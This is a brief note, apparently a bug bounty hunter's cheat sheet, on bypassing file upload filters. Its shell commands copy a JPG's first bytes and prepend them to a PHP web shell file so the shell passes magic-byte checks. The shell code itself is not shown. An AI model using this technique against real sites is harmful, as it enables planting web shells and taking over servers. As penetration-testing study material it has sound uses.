# File Upload


https://www.bugbountyhunter.com/guides/?type=fileuploads

```
head filename.php | xxd
```

Extracting magic bytes from a jpg file to replace in a php file

```
head -c 20 filename.jpg > magicbytes
```

next combine magicbytes and php file

```
cat magicbytes shell.php > shell_magicbytes.php
```